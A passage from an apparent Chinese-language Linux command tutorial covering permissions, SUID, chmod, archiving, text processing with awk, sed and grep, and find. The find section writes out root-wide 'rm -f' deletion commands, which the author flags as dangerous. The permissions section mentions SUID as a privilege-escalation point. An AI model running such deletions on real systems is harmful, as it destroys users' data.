旧名/路径 新名/路径</code> 移动并改名。</p><h2 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h2><h3 id="ls-罗列名目"><a href="#ls-罗列名目" class="headerlink" title="ls 罗列名目"></a>ls 罗列名目</h3><p><code>ls</code> 显示文件和文件夹名。</p><p><code>ls -a</code> 显示所有的文件名和文件夹名（包含隐藏文件）。</p><p><code>ls -l</code> 显示文件和目录的详细资料。l 是 list 列表。</p><p><code>ll </code>不是正统的ls命令，可以理解为起外号，ls -l等同于ll。</p><p><code>ls -al</code> 显示所有文件和目录的详细资料（包含隐藏文件）。</p><p><code>ls -alh</code> h 显示容量单位，人类友好阅读。</p><p><code>ls --help</code> 查看ls命令的帮助文档。</p><h3 id="wc-计算数字"><a href="#wc-计算数字" class="headerlink" title="wc 计算数字"></a>wc 计算数字</h3><p><code>wc</code>命令用来计算数字。利用wc指令我们可以计算文件的Byte数、字数或是列数。</p><p>用法：<code>wc [选项] [文件]</code></p><p>参数：</p><ul><li>-l  显示有多少行</li><li>-c 显示Bytes数</li><li>-w 显示字数（单词数）</li></ul><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wc</span> -l /etc/passwd</span><br><span class="line"><span class="built_in">wc</span> -c /etc/passwd</span><br><span class="line"><span class="built_in">wc</span> -w /etc/passwd</span><br></pre></td></tr></table></figure><h3 id="nl-显示行数"><a href="#nl-显示行数" class="headerlink" title="nl 显示行数"></a>nl 显示行数</h3><p><img src="/img/20221103173150.png"></p><h3 id="du-显示文件占用空间"><a href="#du-显示文件占用空间" class="headerlink" title="du 显示文件占用空间"></a>du 显示文件占用空间</h3><p><code>du</code>命令可查看文件使用空间</p><p>用法：<code>du [选项] [文件]</code></p><p>参数：</p><ul><li>-h  以K，M，G为单位，提高信息的可读性。</li></ul><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">du</span> -h /etc/passwd</span><br></pre></td></tr></table></figure><p>-h查看的是所占空间的大小，并不是文件的大小，最小单位块是4KB，即使一个文件1KB的数据也是占4KB的空间。</p><h3 id="pwd-当前路径"><a href="#pwd-当前路径" class="headerlink" title="pwd 当前路径"></a>pwd 当前路径</h3><p><code>pwd</code> 显示当前工作路径。</p><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>drwxr-xr-x 第一个是当前用户的权限，第二个是用户组的权限，第三是其他用户的权限。</p><p>连接数：对文件是文件内容被系统记录的次数。对目录是目录中文件属性的字节数。</p><p><img src="/img/20220615094222.png"></p><p><img src="/img/20220615095026.png"></p><p>d 是目录 directory。- 表示普通文件，二进制文件。</p><p><img src="/img/20220615095353.png"></p><p>l 表示软连接，相当于Windows的快捷方式。</p><p>此外还有其他形式：</p><ul><li>**<code>-</code>**：常规文件</li><li>**<code>b</code>**：块特殊文件</li><li>**<code>c</code>**：字符特殊文件</li><li>**<code>C</code>**：高性能（”连续数据“）文件</li><li>**<code>d</code>**：目录</li><li>**<code>D</code>**：门(Solaris 2.5及以上版本)</li><li>**<code>l</code>**：符号链接</li><li>**<code>M</code>**：离线（”前已“）文件（Cray DMF）</li><li>**<code>n</code>**：网络专用文件（HP-UX）</li><li>**<code>p</code>**：FIFO（命名管道）</li><li>**<code>P</code>**：断开（Solaros 10及以上）</li><li>**<code>s</code>**：套接字</li><li>**<code>?</code>**：其他文件</li></ul><p><strong>目录</strong>中 r w x的含义：r具有ls权限，w是在目录上可以增加、删除、创建权限，x是具有ls –l权限。</p><p><strong>文件</strong>中r w x -的含义：r是只读权限，w是写的权限，x是可执行权限，- 是没有权限。</p><p><img src="/img/20220615100037.png"></p><p>在第四、第七和第十个字符中，除却常见的<code>x</code>执行权限外，还有其他情况：</p><p>当 x 的位置变成以下字母时，大写没有执行权限，小写有：</p><ul><li>**<code>S</code>**：设置了SUID或SGID，没有 <code>x</code> 权限 </li><li>**<code>s</code>**：设置了SUID或SGID，具有 <code>x</code> 权限 </li><li>**<code>T</code>**：设置了粘滞位，没有 <code>x</code> 权限</li><li>**<code>t</code>**：设置了粘滞位，具有 <code>x</code> 权限</li></ul><p>s出现在第四位就是设置了<code>suid</code>，出现在第七位就是设置了<code>sgid</code> 。</p><p>意义：当一个文件执行的时候需要文件主人的权限，但是又不想把权限给别的用户，可以设置suid，表示无论哪个用户执行此文件都是以文件主人的身份执行的。</p><p>比如 whoami 文件，此命令是查询当前的用户身份。</p><p>当 whoami 文件设置了 suid 后，无论哪个用户执行 whoami 都是以 root 身份执行的。</p><p><img src="/img/20220910175256.png"></p><p><img src="/img/20220910175334.png"></p><p>可以看到，B 用户执行 whoami，打印出来的是root。</p><p>所以在渗透测试中 suid 也是一个提权的点，假如有一个文件设置了suid 并且此文件可以与系统交互，那么低权限用户可以利用此文件进行提权操作。这种文件但凡执行就是root权限。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">粘滞位：</span><br><span class="line">如何才能使一个目录既可以让任何用户写入文件，又不让用户删除这个目录下他人的文件，sticky就是能起到这个作用。stciky一般只用在目录上，用在文件上起不到什么作用，普通文件的sticky位会被linux内核忽略。</span><br><span class="line">如果用户对目录有写权限，则可以删除其中的文件和子目录，即使该用户不是这些文件的所有者，而且也没有读或写许可。粘着位出现执行许可的位置上，用t表示，设置了该位后，其它用户就不可以删除不属于他的文件和目录。但是该目录下的目录不继承该权限，要再设置才可使用。</span><br><span class="line">目录的sticky位表示这个目录里的文件只能被owner和root删除 。</span><br><span class="line">/tmp常被我们用来存放临时文件，是所有用户。但是我们不希望别的用户随随便便的就删除了自己的文件，于是便有了粘连位，它的作用便是让用户只能删除属于自己的文件。</span><br><span class="line"></span><br><span class="line">举例：</span><br><span class="line">drwxrwxrwt 15 root   root  .........  </span><br><span class="line">那么原来的执行标志x到哪里去了呢? 系统是这样规定的, 假如本来在该位上有x, 则这些特别标志 (suid, sgid, sticky) 显示为小写字母 (s, s, t). 否则, 显示为大写字母 (S, S, T) 。</span><br><span class="line"></span><br><span class="line">另外：<span class="built_in">chmod</span> 777 abc  </span><br><span class="line"></span><br><span class="line"> 　　 <span class="built_in">chmod</span> +t abc   </span><br><span class="line">等价于  </span><br><span class="line">　　  <span class="built_in">chmod</span> 1777 abc  </span><br></pre></td></tr></table></figure><p><img src="/img/20220910104116.png"></p><p>第十一个字符的含义： </p><ul><li>**<code>.</code>**：没有任何其他替代访问方法的SELinux安全上下文（没有设置ACL）</li><li>**<code>+</code>**：具有任何其他组合访问方法的SELinux安全上下文（设置了ACL）</li></ul><h3 id="chmod-命令"><a href="#chmod-命令" class="headerlink" title="chmod 命令"></a>chmod 命令</h3><p>用法：<code>chmod [-R] 755 filename</code> </p><p><code>-R</code>参数代表递归，将目录以下所有文件都赋予同样的权限。</p><p><code>chmod 777 +文件名</code> （给单独文件赋所有权限）。</p><p>4+2+1&#x3D;7，7表示rwx所有权限。</p><p><code>chmod -R 777 /home/user</code> 表示递归整个&#x2F;home&#x2F;user目录与其中的文件和子目录的权限都设置为rwxrwxrwx。</p><p>更改文件权限：</p><p><code>chmod 654 /test</code></p><p>对用户可读可写：4（读取）+ 2（写入）&#x3D; 6 ；</p><p>对用户组可读可执行：4（读取）+ 1（执行）&#x3D; 5 ；</p><p>对其他用户仅可读：4（读取）；</p><p><strong>常用权限</strong></p><p>-rw——- (600) 只有所有者才有读和写的权限。</p><p>-rw-r–r– (644) 只有所有者才有读和写的权限，组群和其他人只有读的权限。</p><p>-rwx—— (700) 只有所有者才有读，写，执行的权限。</p><p>-rwxr-xr-x (755) 只有所有者才有读，写，执行的权限，组群和其他人只有读和执行的权限。</p><p>-rwx–x–x (711) 只有所有者才有读，写，执行的权限，组群和其他人只有执行的权限。</p><p>-rw-rw-rw- (666) 每个人都有读写的权限。</p><p>-rwxrwxrwx (777) 每个人都有读写和执行的权限。</p><p><strong>字母模式</strong> </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+x filename <span class="comment">#表示只授予这个文件的所属者执行的权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x filename 相当于 <span class="built_in">chmod</span> a+x filename</span><br><span class="line"><span class="built_in">chmod</span> u+rwx filename <span class="comment">#当前用户加全部的权限。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> g-r filename <span class="comment">#群组读取权限去掉。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> o-r filename <span class="comment">#其他用户读取权限去掉。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> ug=rwx,o=x filename</span><br></pre></td></tr></table></figure><table><thead><tr><th>Operator</th><th>说明</th></tr></thead><tbody><tr><td><code>+</code></td><td>为指定的用户类型增加权限</td></tr><tr><td><code>-</code></td><td>去除指定用户类型的权限</td></tr><tr><td><code>=</code></td><td>设置指定用户权限的设置，即将用户类型的所有权限重新设置</td></tr></tbody></table><table><thead><tr><th>who</th><th>用户类型</th><th>说明</th></tr></thead><tbody><tr><td><code>u</code></td><td>user</td><td>文件所有者</td></tr><tr><td><code>g</code></td><td>group</td><td>文件所有者所在组</td></tr><tr><td><code>o</code></td><td>others</td><td>所有其他用户</td></tr><tr><td><code>a</code></td><td>all</td><td>所用用户, 相当于 <code>ugo</code></td></tr></tbody></table><table><thead><tr><th align="left">模式</th><th align="left">名字</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>r</code></td><td align="left">读</td><td align="left">设置为可读权限</td></tr><tr><td align="left"><code>w</code></td><td align="left">写</td><td align="left">设置为可写权限</td></tr><tr><td align="left"><code>x</code></td><td align="left">执行权限</td><td align="left">设置为可执行权限</td></tr><tr><td align="left"><code>X</code></td><td align="left">特殊执行权限</td><td align="left">只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行</td></tr><tr><td align="left"><code>s</code></td><td align="left">setuid&#x2F;gid</td><td align="left">当文件被执行时，根据who参数指定的用户类型，设置文件的setuid或者setgid权限</td></tr><tr><td align="left"><code>t</code></td><td align="left">粘贴位</td><td align="left">设置粘贴位，只有超级用户可以设置该位，只有文件所有者u可以使用该位</td></tr></tbody></table><h2 id="压缩和解压"><a href="#压缩和解压" class="headerlink" title="压缩和解压"></a>压缩和解压</h2><h3 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h3><p><code>gzip test.txt</code> 压缩一个叫做 test.txt 的文件，原文件会被删除。</p><p><code>gunzip test.txt.gz</code> 解压一个叫做 test.txt.gz 的文件。</p><h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><p><code>tar -zcvf xxxx.tar.gz xxxx</code> 压缩命令，xxxx是要被压缩的文件(夹)名。</p><p><code>tar -zxvf xxxx.tar.gz xxxx</code> 解压缩命令。</p><p><code>tar -jvcf xxxx.tar.tz2 xxxx</code> 压缩命令。</p><p><code>tar -jvxf xxxx.tar.tz2 xxxx</code> 解压缩命令。</p><p><code>tar -jcvf xxxx.tar.bz2 xxxx</code> 压缩命令。</p><p><code>tar -jxvf xxxx.tar.bz2 xxxx</code> 解压缩命令。</p><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p><code>zip -q -r xxxx.zip xxxx</code> 压缩成zip格式。</p><p><code>unzip xxxx.zip</code> 解压zip格式的压缩包。</p><h2 id="diff-比较"><a href="#diff-比较" class="headerlink" title="diff 比较"></a>diff 比较</h2><p><code>diff</code> 命令用于比较文件的差异。</p><p><code>diff</code>以逐行的方式，比较文本文件的异同处。如果指定要比较目录，则 diff 会比较目录中相同文件名的文件，但不会比较其中子目录。</p><p>参数：</p><ul><li>-i：忽略大小写。</li></ul><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">diff 1.txt 2.txt</span><br></pre></td></tr></table></figure><p>diff命令所参考的不是第一个文件，而是第二个文件，它的输出信息有以下几种字符：</p><p>c: 表示第一个文件必须做一些修改才能使两个文件相同</p><p>a: 表示第一个文件必须添加一些内容才能使两个文件相同</p><p>d: 表示第一个文件必须删除一些内容才能使两个文件相同</p><p>举例：</p><p><img src="/img/20220901141725.png"></p><p><code>5,8c5,8</code>代表从第五行到第八行需要修改才能使两个文件一致。其中<code>&lt;</code>和<code>&gt;</code>代表不同的字符属于前后哪个文件。</p><h2 id="sort-排序"><a href="#sort-排序" class="headerlink" title="sort 排序"></a>sort 排序</h2><p><code>sort</code>命令是在Linux里非常有用，它将文件进行排序，并将排序结果标准输出。</p><ul><li>-b, –ignore-leading-blanks    忽略开头的空白。</li><li>-d, –dictionary-order         仅考虑空白、字母、数字。</li><li>-n, –numeric-sort             根据数字排序。</li><li>-r, –reverse                  将结果倒序排列。</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt|<span class="built_in">sort</span>            <span class="comment">#默认的排序方式，从首字母开始</span></span><br><span class="line"><span class="built_in">cat</span> 1.txt|<span class="built_in">sort</span> -d         <span class="comment">#按照字典进行排序</span></span><br><span class="line"><span class="built_in">cat</span> 1.txt|<span class="built_in">sort</span> -n         <span class="comment">#按照数字进行排序</span></span><br><span class="line"><span class="built_in">cat</span> 1.txt|<span class="built_in">sort</span> -nr        <span class="comment">#按照数字进行倒序排序</span></span><br></pre></td></tr></table></figure><h2 id="uniq-去重"><a href="#uniq-去重" class="headerlink" title="uniq 去重"></a>uniq 去重</h2><p><code>uniq</code>用于报告或忽略文件中的重复行，一般与sort命令结合使用。</p><p>要注意先排序，后去重。因为uniq命令只能消除相邻且相同的行。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt |<span class="built_in">sort</span> -n |<span class="built_in">uniq</span>              <span class="comment">#排序去重</span></span><br><span class="line"><span class="built_in">cat</span> 1.txt|<span class="built_in">sort</span> -n |<span class="built_in">uniq</span> -c            <span class="comment">#列出重复的次数</span></span><br><span class="line"><span class="built_in">cat</span> 1.txt |<span class="built_in">sort</span> -n |<span class="built_in">uniq</span> -d           <span class="comment">#列出有哪些行是重复的</span></span><br></pre></td></tr></table></figure><p><img src="/img/20221102122221.png"></p><p><img src="/img/20221102122243.png"></p><p><img src="/img/20221102122300.png"></p><p>以上系列命令可以用于日志分析：</p><p>如统计IP地址的访问数量并按照数量进行排序： <code>cat access_log |awk &#39;&#123;print($1)&#125;&#39;|sort|uniq -c |sort -nr |more</code></p><p>针对访问量最大的IP分析其访问内容： <code>cat access_log |grep &#39;IP地址&#39;|head -n 100</code> </p><h2 id="split-分割"><a href="#split-分割" class="headerlink" title="split 分割"></a>split 分割</h2><p><code>split</code>命令可以将一个大文件分割成很多个小文件，有时需要将文件分割成更小的片段，比如为提高可读性，生成日志等。</p><p>参数：</p><ul><li>-b 按文件大小进行切割</li><li>-l 按行数来进行切割</li><li>-d 为使用数字为生成文件的后缀</li><li>-a 指定后缀的长度</li></ul><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">split</span> -b 30k messages    <span class="comment"># 按照每个文件30K大小切割messages文件。</span></span><br><span class="line"><span class="built_in">split</span> -l 300 messages    <span class="comment"># 将messages文件切割为每3行一份。</span></span><br></pre></td></tr></table></figure><p><img src="/img/20221102120554.png"></p><h2 id="文本处理"><a href="#文本处理" class="headerlink" title="文本处理"></a>文本处理</h2><h3 id="awk-提取列"><a href="#awk-提取列" class="headerlink" title="awk 提取列"></a>awk 提取列</h3><p><code>awk</code>是一种处理文本文件的语言，是一个强大的文本分析工具。</p><p>相比较屏幕处理的优点，<code>awk</code>在处理庞大文件时不会出现内存溢出或是处理缓慢的问题，通常用来格式化文本信息。 <code>awk</code>也是一个非常棒的数据处理工具！相较于<code>sed</code>常常作用于一整个行的处理, <code>awk</code>则比较倾向于一行当中分成数个<code>字段</code>来处理。</p><p><code>awk</code>处理过程: 依次对每一行进行处理，然后输出。</p><p>命令的基本格式是：<code>awk ‘&#123;print($1)&#125;’</code></p><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt|awk <span class="string">&#x27;&#123;print($2)&#125;&#x27;</span>                 <span class="comment">#打印出文本中每行的第二个字段</span></span><br></pre></td></tr></table></figure><p><img src="/img/20221019222002.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd |awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1)&#125;&#x27;</span>  <span class="comment">#-F指定分隔符，以“：”为分隔符，打印出文本中每行第一个字段</span></span><br></pre></td></tr></table></figure><p><img src="/img/20221019222407.png"></p><p>打印uid为0，但不是root的用户。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;$3==0 &#123;print($1)&#125;&#x27;</span> /etc/passwd |grep -v root  </span><br></pre></td></tr></table></figure><p>打印出第一个字段与第三个字段。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1,$3)&#125;&#x27;</span> /etc/passwd   </span><br></pre></td></tr></table></figure><p>加点文字。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1,&quot;的uid是&quot;,$3)&#125;&#x27;</span> /etc/passwd <span class="comment">#在所需字段中间加上一些文字</span></span><br><span class="line">awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print($1&quot;的uid是&quot;$3)&#125;&#x27;</span> /etc/passwd   <span class="comment">#对比差异</span></span><br></pre></td></tr></table></figure><p><img src="/img/20230718151414.png"></p><p><img src="/img/20230718151449.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd | awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span>       <span class="comment">#打印出文本中每行的最后一个字段</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $(NF-1)&#125;&#x27;</span>   <span class="comment">#打印出文本中每行的倒数第二个字段。$（NF-1）为倒数第二，依此类推。</span></span><br></pre></td></tr></table></figure><p><img src="/img/20221020102341.png"></p><p><img src="/img/20221020102429.png"></p><h4 id="筛选ip"><a href="#筛选ip" class="headerlink" title="筛选ip"></a>筛选ip</h4><p>以思科路由器为例，复制一大堆包含MAC地址和ip等信息的文本。用awk提取ip。</p><p>复制。</p><p><img src="/img/20221020113927.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi ip  <span class="comment">#粘贴到ip文本文件中</span></span><br></pre></td></tr></table></figure><p><img src="/img/20221020114144.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ip |xargs -n7 <span class="comment">#以空格为分隔符，每行7部分</span></span><br></pre></td></tr></table></figure><p><img src="/img/20221020114249.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ip |xargs -n7 |awk &#x27;&#123;print($6)&#125;&#x27; #提取出ip</span><br></pre></td></tr></table></figure><p><img src="/img/20221020114503.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ip |xargs -n7 |awk <span class="string">&#x27;&#123;print($6)&#125;&#x27;</span>&gt;&gt;ip.txt <span class="comment">#提取出ip并保存到ip.txt</span></span><br></pre></td></tr></table></figure><h3 id="sed-查找替换"><a href="#sed-查找替换" class="headerlink" title="sed 查找替换"></a>sed 查找替换</h3><p><code>sed</code> 是stream editor(流编辑器)的简称，是一款强大的,并且有些复杂的程序。</p><p><code>sed</code> 本身是一个管线命令，可以将数据进行替换、删除、新增、提取特定行等功能，主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。sed按行来执行命令。</p><ul><li>-n 只显示匹配处理的行（否则会输出所有）（也就是关闭默认的输出）</li></ul><p>接下来的实验，我们要以&#x2F;etc&#x2F;passwd文件内容为例子。</p><p>拷贝文件<code>cat /etc/passwd &gt; 1.txt</code></p><p>我们以一个例子来介绍<code>sed</code>命令，<code>sed &#39;s/:/+/g&#39;</code></p><p>s代表搜索，g代表的则是全文。不加g的话则是替换每行第一个出现的。所以这条命令代表的将文件中所有的<code>:</code>替换为<code>+</code>。</p><p><img src="/img/20221020163633.png"></p><p><code>cat 1.txt |sed &#39;s/:/+/3g&#39;</code> #代表的则是从第三次匹配开始替换，依此类推。</p><p><img src="/img/20221020163737.png"></p><p><code>sed -i &#39;s/:/+/g&#39; 1.txt</code> #参数<code>-i</code>,直接修改文件，并非打印出来。</p><p><img src="/img/20221020163918.png"></p><p>以上这些命令中是以&#x2F;做为该命令的定界符，如果需要修改或者匹配的字段带有&#x2F;则不能再使用&#x2F;做为该条命令的定界符，可以使用任意的定界符，不冲突就行。<code>cat passwd |sed &#39;s!:!/!g&#39;</code> 以！号做为定界也是一样的。也可以用<code>@</code>和<code>#</code>等等。</p><p>此外，在此命令中，搜索位置使用<code>^</code>代表一行的开头，<code>$</code>代表一行的结尾。<code>sed</code>是以行为单位执行的。</p><p>我们用如下案例展示：</p><p><code>cat ip.txt |sed &#39;s#^#http://#g&#39;</code>在每行之前加上<code>http://</code>。</p><p><img src="/img/20221020164427.png"></p><p><code>cat ip.txt |sed &#39;s#$#:8080#g&#39;</code>在每行末尾加上“:8080”</p><p><img src="/img/20221020164937.png"></p><p><code>sed &#39;/^$/d&#39; 2.txt</code>删除空白的行。</p><p><img src="/img/20221020165122.png"></p><p><code>sed &#39;/^s/&#39;d</code> 删除文件中所有开头是s的行。</p><p><img src="/img/20221020165521.png"></p><h3 id="grep-正则查找"><a href="#grep-正则查找" class="headerlink" title="grep 正则查找"></a>grep 正则查找</h3><p>grep这个名字来自于短语“global regular expression print”，所以我们能看出 grep 程序和正则表达式有关联。</p><p>本质上，grep 程序会在文本文件中查找一个指定的正则表达式,并把匹配行输出到标准输出。</p><p>命令格式： <code>grep [options] [pattern]　[filename]</code></p><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> passwd |grep root                          <span class="comment"># 只显示带有root关键字的行</span></span><br><span class="line">grep -e root passwd                            <span class="comment"># 匹配有root的行</span></span><br><span class="line">grep -v root passwd                            <span class="comment"># 忽略匹配到的行</span></span><br><span class="line"><span class="built_in">cat</span> passwd |grep -E <span class="string">&quot;root|sshd&quot;</span>                <span class="comment"># 包含多个可能性的行</span></span><br><span class="line"><span class="built_in">cat</span> passwd |grep -E <span class="string">&#x27;^r&#x27;</span>                       <span class="comment"># 以r开头的行</span></span><br><span class="line"><span class="built_in">cat</span> passwd |grep -E <span class="string">&#x27;n$&#x27;</span>                       <span class="comment"># 以n结尾的行</span></span><br><span class="line"><span class="built_in">cat</span> /etc/selinux/config |grep -v <span class="string">&#x27;^#&#x27;</span>          <span class="comment"># 忽略井号开头的行</span></span><br><span class="line">grep -Ev <span class="string">&#x27;^$|^#&#x27;</span> /etc/selinux/config           <span class="comment"># 忽略空行和井号开头的行</span></span><br><span class="line">grep “root” /etc/passwd /etc/shadow            <span class="comment"># 查询多个文件</span></span><br><span class="line">grep <span class="string">&quot;passwd&quot;</span> /etc -rn                         <span class="comment"># -r 为递归 -n 显示关键字出现在第几行   在多级目录中对文本进行递归查找</span></span><br></pre></td></tr></table></figure><p><img src="/img/20221020175420.png"></p><p><img src="/img/20221020175446.png"></p><p><img src="/img/20221020175511.png"></p><h2 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h2><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p><code>find</code> 命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p><p>这是一个超级复杂的命令，最简单的模式为：<code>find 路径 -name [名字]</code>。</p><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -size 1000k          <span class="comment">#从根目录查找大小为1000K的文件</span></span><br><span class="line">find -name <span class="string">&#x27;1*&#x27;</span>            <span class="comment">#在当前目录下查找文件名以1开始的文件</span></span><br><span class="line">find / -name <span class="string">&#x27;1*&#x27;</span>           <span class="comment">#从根目录查找文件名以1开始的文件</span></span><br><span class="line">find / -user farmsec1       <span class="comment">#从根目录查找属主为farmsec1的文件</span></span><br><span class="line">find / -group farmsec       <span class="comment">#从根目录查找属组为farmsec的文件</span></span><br><span class="line">find /etc -<span class="built_in">type</span> f/d         <span class="comment">#按sock类型查找，f代表文件，d代表目录</span></span><br><span class="line"><span class="comment"># mac</span></span><br><span class="line"><span class="comment"># m代表modify，意为查找内容被修改过的文件</span></span><br><span class="line"><span class="comment"># a代表access，意为查找被访问的文件</span></span><br><span class="line"><span class="comment"># c代表change，意为查找状态被改变（列如权限）的文件</span></span><br><span class="line"><span class="comment"># time = 天 ， min = 分钟</span></span><br><span class="line">find . -mtime -7 -<span class="built_in">type</span> f    <span class="comment">#搜索7天内当前目录下修改过的文件（-7代表7天内，7代表前7天那一天，+7代表7天前）</span></span><br><span class="line">find . -mmin -10 -<span class="built_in">type</span> f    <span class="comment">#搜索10分钟内当前目录下修改过的文件 </span></span><br><span class="line">find . -atime -1 -<span class="built_in">type</span> f    <span class="comment">#搜索当前目录下一天内被访问的文件（-1代表1天内，1代表前1天那一天，+1代表1天前）</span></span><br><span class="line">find . -amin -10 -<span class="built_in">type</span> f    <span class="comment">#搜索当前目录下10分钟内被访问的文件</span></span><br><span class="line">find . -ctime -1 -<span class="built_in">type</span> f    <span class="comment">#搜索当前目录下一天内状态被改变（列如权限）的文件（-1代表1天内，1代表前1天那一天，+1代表1天前）</span></span><br><span class="line">find . -cmin -10 -<span class="built_in">type</span> f    <span class="comment">#搜索当前目录下10分钟内状态被改变的文件</span></span><br><span class="line">find /etc -user root -atime -3 -<span class="built_in">type</span> f <span class="comment">#搜索/etc目录下属于root用户3天内被访问过的文件</span></span><br><span class="line">find . -perm 777            <span class="comment">#搜索处当前文件下符合777权限的文件</span></span><br></pre></td></tr></table></figure><p><code>find / -name xxx</code>  从 &#x2F; 开始进入根文件系统搜索名为xxx的文件和目录。</p><p><code>find / -name xxx 2&gt;/dev/null</code> 搜索某个文件&#x2F;文件夹，屏蔽出错信息。</p><p><code>sudo find / -name *xxx*</code> 使用*通配符，搜索出包含 xxx 的文件&#x2F;目录名。</p><p><code>find / -user user1</code> 搜索属于用户 ‘user1’ 的文件和目录。</p><p><code>find /home/user1 -name *.bin</code> 在目录 &#x2F; home&#x2F;user1 中搜索.bin结尾的文件。</p><p><code>find /usr/bin -type f -atime +100</code> 搜索100天内未被使用过的执行文件。</p><p><code>find /usr/bin -type f -mtime -10</code> 搜索10天内被创建或者修改过的文件。</p><p><code>find /usr/bin abc* -mtime 0</code> 查找最近24小时被修改过abc开头的文件&#x2F;目录。</p><p><code>find . -name &#39;*.php&#39; -mmin -30</code>  查找最近30分钟修改的当前目录下的.php文件。</p><p><code>find . -name -mmin -30</code>  查找最近30分钟修改的当前目录下的文件。</p><p><code>find . -name &#39;*.php&#39; -mtime 0</code> 查找最近24小时修改的当前目录下的.php文件。</p><p><code>find . -name &#39;*.inc&#39; -mtime 0 -ls</code> 查找最近24小时修改的当前目录下的.php文件，并列出详细信息。</p><p><code>find / -type f -mtime 0</code> 查找最近24时修改过的常规文件。</p><p><code>find . -type f -mtime 1</code> 查找当前目录下，最近24-48小时修改过的常规文件。</p><p><code>find . -type f -mtime +1</code> 查找当前目录下，最近1天前修改过的常规文件。</p><ul><li>exec选项</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find 搜索路径 [选项] 搜索内容 -<span class="built_in">exec</span> 命令2&#123;&#125;\;</span><br><span class="line">find . -<span class="built_in">type</span> f -perm 644 -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \;</span><br><span class="line">find / -<span class="built_in">exec</span> grep <span class="string">&quot;Hello&quot;</span> &#123;&#125; \;</span><br><span class="line"></span><br><span class="line">find / -name <span class="string">&quot;*.tmp&quot;</span> -<span class="built_in">exec</span> <span class="built_in">rm</span> -f &#123;&#125; \;   (危险)</span><br><span class="line">find / -name <span class="string">&quot;*&quot;</span> -ctime +2 -<span class="built_in">exec</span> <span class="built_in">rm</span> -f &#123;&#125; \;（危险，别敲）</span><br></pre></td></tr></table></figure><p><strong>参数说明：</strong> </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-atime <span class="comment">#文件访问时间。</span></span><br><span class="line">-ctime <span class="comment">#文件创建时间。</span></span><br><span class="line">-mtime <span class="comment">#文件修改时间。</span></span><br><span class="line"></span><br><span class="line">-mtime n <span class="comment">#在n天之前的“一天之内”被更改过内容的文件。</span></span><br><span class="line">-mtime +n <span class="comment">#列出在n天之前（不含n天本身）被更改过内容的文件名。</span></span><br><span class="line">-mtime -n <span class="comment">#列出在n天之内（含n天本身）被更改过内容的文件名。</span></span><br><span class="line"></span><br><span class="line">-<span class="built_in">type</span> f <span class="comment">#代表一个普通格式的文件，二进制文件。</span></span><br><span class="line">-<span class="built_in">type</span> d <span class="comment">#代表文件夹。</span></span><br></pre></td></tr></table></figure><h3 id="ag-命令"><a href="#ag-命令" class="headerlink" title="ag 命令"></a>ag 命令</h3><p><code>ag</code>类似<code>grep</code>和<code>find</code>，但是执行效率比后两者高。</p><p>最基本的用法为<code>ag -g &lt;File Name&gt;</code>,从当前目录寻找文件</p><p><img src="/img/20221102115821.png"></p><p>案例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ag -g &lt;File 